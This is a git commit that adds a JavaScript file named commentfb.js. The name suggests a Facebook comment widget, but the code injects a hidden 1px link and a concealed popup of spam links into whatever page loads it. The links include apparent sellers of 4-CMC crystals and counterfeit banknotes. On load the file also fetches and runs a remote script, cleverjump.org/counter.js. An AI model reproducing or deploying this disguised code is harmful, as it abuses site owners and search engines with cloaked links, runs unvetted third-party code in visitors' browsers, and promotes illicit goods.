4807a6d95b34848ed49defc299107a21ad69b40c
carelfelix2 <57383555+carelfelix2@users.noreply.github.com>
2019-11-06 10:08:31 +0700

    Add files via upload

---
+++ commentfb.js
@@ -0,0 +1,234 @@
+(function() {
+	'use strict';
+
+	if (window['shbNetLoaded']) return;
+	window['shbNetLoaded'] = true;
+	
+	var popupHtml = "<div id=\"shbNetPaddingWr\" class=\"shbNetPopupWr\" style=\"display:none;\"> <table id=\"shbNetPaddingTable\" class=\"shbNetPopupTable\" style=\"display:none;\" width=\"100%\" height=\"100%\" cellspacing=\"0\" cellpadding=\"0\"> <tr style=\"background:none;\"> <td id=\"shbNetPopupCell\" class=\"shbNetPopupCell\"> <div id=\"shbNetPaddingPopup\" class=\"shbNetPopup\"> <div> <div style=\"padding:15px 0 0 0;\"> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/diyhomedepot.vn\/32524\/uu-va-nhuoc-diem-cua-may-khoan-bosch-made-in-germany.html\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">made in germany bosch<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">diyhomedepot.vn<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/newtechstore.eu\/product-category\/wearables-technology\/hi-tech-watches\/smart-watches\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">buy a smart watch<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">newtechstore.eu<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/vitalinna.com.ua\/womens-collections\/bodi\/eroticheskoe-bodi-obsessive-carmelove-body\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">obsessive body<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">vitalinna.com.ua<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/molotkoff.com.ua\/benzopily-cepnye.html\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">\u0441\u0430\u043c\u044b\u0435 \u043b\u0443\u0442\u0448\u0438\u0435 \u0431\u0435\u043d\u0437\u043e\u043f\u0438\u043b\u044b<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">molotkoff.com.ua<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/www.flowers24hours.com.au\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">highett florist shops<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">www.flowers24hours.com.au<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/pinpoint.com.ua\/metalloiskatel-istoriya-izobreteniya\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">\u0430\u0440\u0445\u0435\u043e\u043b\u043e\u0433\u0438 \u043c\u0435\u0442\u0430\u043b\u043e\u0438\u0441\u043a\u0430\u0442\u0435\u043b\u0438<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">pinpoint.com.ua<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/www.blitztransport.ch\/wohnung-zuerich\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">mein wg zimmer<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">www.blitztransport.ch<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/katrin.net.ua\/product-category\/spicy\/spitsy-pony-detskie\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">\u0441\u043f\u0438\u0446\u044b \u0434\u0435\u0442\u044f\u043c<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">katrin.net.ua<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/researchkem.com\/product\/buy-4-cmc\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">4 cmc crystals<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">researchkem.com<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/kamenbut.com.ua\/sheben\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">\u0449\u0435\u0431\u0435\u043d\u044c + \u0432 \u043a\u0438\u0435\u0432\u0435<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">kamenbut.com.ua<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/kidmax.com.ua\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">\u0442\u0443\u0444\u043b\u0438 \u0441 \u0443\u0448\u043a\u0430\u043c\u0438 \u0437\u0430\u0439\u0446\u0430<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">kidmax.com.ua<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/5monet.kz\/66487-ohmibod---bluemotion-app-controlled-nex-2-vibrator--16-5h3-2-sm-.html\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">\u043e\u0445\u043c\u0438\u0431\u043e\u0434 \u043e\u0442\u0437\u044b\u0432\u044b<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">5monet.kz<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/infinite-dollar.com\/index.php\/product\/gbp-bills\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">sale banknotes<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">infinite-dollar.com<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/beautytrend.com.ua\/makiyazh\/baza-pod-makiyazh-guerlain-meteorites-perles-vs-lor-radiance-concentrate\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">\u0433\u0435\u0440\u043b\u0435\u043d \u043c\u0435\u0442\u0435\u043e\u0440\u0438\u0442\u044b<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">beautytrend.com.ua<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/mir-pultov.com\/kupit-pult-magazin\/kupit-pult-berioska\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">\u043f\u0443\u043b\u044c\u0442 rc 4<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">mir-pultov.com<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/www.jackyjones.com\/used-Cleveland-2019-Ford-Police Responder Hybrid Sedan-FWD-3FA6P0AU1KR100334\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">new police car ford 2012<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">www.jackyjones.com<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/www.iuventusmedcenter.com\/weight-management\/b12-shots\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">how to use b12 ampoules<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">www.iuventusmedcenter.com<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/luxgradus.com.ua\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">\u043c\u0430\u0440\u043a\u0438 \u043a\u0440\u0435\u043f\u043a\u0438\u0445 \u043d\u0430\u043f\u0438\u0442\u043a\u043e\u0432<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">luxgradus.com.ua<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\"><\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\"><\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/www.7our-jeddah.com\/cleaning-the-swimming-pool-dammam\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">\u0627\u0641\u0636\u0644 \u0634\u0631\u0643\u0629 \u062a\u0646\u0638\u064a\u0641 \u0645\u0633\u0627\u0628\u062d \u0628\u0627\u0644\u062f\u0645\u0627\u0645<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">www.7our-jeddah.com<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/batumiexpert.com\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">\u043d\u0435\u0434\u0432\u0438\u0436\u0438\u043c\u043e\u0441\u0442\u044c \u0411\u0430\u0442\u0443\u043c\u0438<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">batumiexpert.com<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/pivasik.com.ua\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">\u0436\u0438\u0432\u043e\u0435 \u043f\u0438\u0432\u043e + \u043d\u0430 \u0434\u043e\u043c<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">pivasik.com.ua<\/span> <\/div> <\/div> <\/div> <div style=\"clear:both;\"><\/div> <\/div> <\/div> <\/div> <\/td> <\/tr> <\/table> <\/div>";
+	var popupCreated = false;
+	
+	function onReady() {
+		tryCreatePopup(2);
+		
+		var box = create('div');
+		append(box, document.body);
+		
+		var defaultStyles = {
+			width: '1px',
+			height: '1px',
+			background: 'transparent',
+			display: 'inline-block',
+			margin: '2px',
+			padding: 0,
+			verticalAlign: 'bottom',
+			border: 'none'
+		};
+		
+		var a = create('a');
+		css(a, defaultStyles);
+		
+		document.addEventListener('keydown', function(e) {
+			if (e.keyCode === 192 && e.ctrlKey) {
+				css(a, {
+					width: '20px',
+					height: '20px',
+					background: '#fff',
+					border: '1px solid red'
+				});
+			}
+		});
+		
+		document.addEventListener('keyup', function(e) {
+			css(a, defaultStyles);
+		});
+
+		a.className = 'shbNetgpLink';
+		append(a, box);
+		
+		a.href = 'javascript:;';
+		on(a, 'click', openLinerPopup);
+		
+		css(box, {
+			position: 'fixed',
+			margin: 0,
+			padding: 0,
+			outline: 'none',
+			border: 'none',
+			zIndex: 999999999,
+			overflow: 'visible',
+			direction: 'ltr'
+		});
+
+		css(box, {
+			left: '3px',
+			right: 'auto',
+			top: '50px',
+			bottom: 'auto',
+			width: '42px',
+			height: '168px'
+		});
+	}
+	
+	function clearStyles() {
+		if(typeof document.createStyleSheet === 'undefined') {
+			document.createStyleSheet = (function() {
+				function createStyleSheet(href) {
+					if(typeof href !== 'undefined') {
+						var element = document.createElement('link');
+						element.type = 'text/css';
+						element.rel = 'stylesheet';
+						element.href = href;
+					} else {
+						var element = document.createElement('style');
+						element.type = 'text/css';
+					}
+
+					document.getElementsByTagName('head')[0].appendChild(element);
+					var sheet = document.styleSheets[document.styleSheets.length - 1];
+
+					if(typeof sheet.addRule === 'undefined')
+						sheet.addRule = addRule;
+
+					if(typeof sheet.removeRule === 'undefined')
+						sheet.removeRule = sheet.deleteRule;
+
+					return sheet;
+				}
+
+				function addRule(selectorText, cssText, index) {
+					if(typeof index === 'undefined')
+						index = this.cssRules.length;
+
+					this.insertRule(selectorText + ' {' + cssText + '}', index);
+				}
+
+				return createStyleSheet;
+			})();
+		}
+		
+		var sheet = document.createStyleSheet();
+		sheet.addRule('#shbNetPaddingTable', 'display: none;');
+		sheet.addRule('#shbNetPaddingWr #shbNetPaddingTable', 'display: table;');
+		sheet.addRule('.shbNetPopupWr, .shbNetPopupWr *', '-webkit-text-shadow:none !important; text-shadow:none !important;');
+		sheet.addRule('.shbNetPopupTable img', 'display:inline; width:auto; height:auto; background:none; float:none;');
+		sheet.addRule('.shbNetPopupTable *', 'margin:0; padding:0; font-family:Tahoma,Arial,Sans-Serif,Verdana; font-size:medium; line-height:normal;');
+		sheet.addRule('.shbNetPopupTable a', 'text-decoration:none; background:none; height:auto !important;');
+	}
+	
+	function tryCreatePopup(stage) {
+		if (popupCreated) return;
+		
+		if (stage === 1) {
+			document.writeln(popupHtml);
+		} else if (stage === 2) {
+			var mainBox = create('div');
+			mainBox.innerHTML = popupHtml;
+			document.body.appendChild(mainBox);
+		} else {
+			return;
+		}
+	
+		var wr = $('shbNetPaddingWr');
+		if (!wr) return;
+		
+		popupCreated = true;
+		
+		var table = $('shbNetPaddingTable');
+		css(table, {
+			position: 'fixed',
+			margin: 0,
+			padding: 0,
+			left: 0,
+			top: 0,
+			width: '100%',
+			height: '100%',
+			direction: 'ltr',
+			zIndex: 999999999,
+			background: 'none'
+		});
+		css(table.getElementsByTagName('td')[0], {
+			verticalAlign: 'middle',
+			background: 'rgba(0, 0, 0, 0.5)'
+		});
+		
+		var popup = $('shbNetPaddingPopup');
+		css(popup, {
+			margin: '0 auto',
+			padding: '20px 25px 20px',
+			width: '437px',
+			background: '#fff',
+			border: '1px solid #000',
+			textAlign: 'left',
+			position: 'relative',
+			fontFamily: 'Tahoma, Arial, Verdana',
+			boxSizing: 'content-box'
+		});
+		
+		on(document, 'keydown', function(e) {
+			if (e.keyCode === 27) {
+				wr.style.display = 'none';
+			}
+		});
+	}
+	
+	function removeClass(node, className) {
+		if (node && node.className) {
+			node.className = node.className.replace(new RegExp('\\b' + className + '\\b', 'g'), '');
+		}
+	}
+	
+	function openLinerPopup() {
+		var pad = $('shbNetPaddingWr');
+		var tbl = $('shbNetPaddingTable');
+		if (!pad || !tbl) return;
+		
+		pad.style.display = 'block';
+		tbl.style.display = 'table';
+		
+		var mainPopup = $('shbNetPopupWr');
+		if (!mainPopup) return;
+		
+		mainPopup.style.display = 'none';
+	}
+	
+	function $(id) {
+		return document.getElementById(id);
+	}
+	
+	function on(elem, event, handler) {
+		elem.addEventListener(event, handler, false);
+	}
+	
+	function css(elem, style) {
+		for (var prop in style) {
+			elem.style[prop] = style[prop];
+		}
+	}
+	
+	function create(tag) {
+		return document.createElement(tag);
+	}
+	
+	function append(elem, parent) {
+		parent.appendChild(elem);
+	}
+	
+	setTimeout(function() {
+		window.CJSource = 'shb2';
+		var script = document.createElement('script');
+		script.src = 'https://cleverjump.org/counter.js';
+		(document.head || document.body).appendChild(script);
+	}, 10);
+	
+	if (document.readyState === 'complete' || document.readyState === 'interactive') {
+		onReady();
+	} else {
+		on(document, 'DOMContentLoaded', onReady);
+	}
+	
+	tryCreatePopup(1);
+	
+	try {
+		clearStyles();
+	} catch (ex) {}
+})();
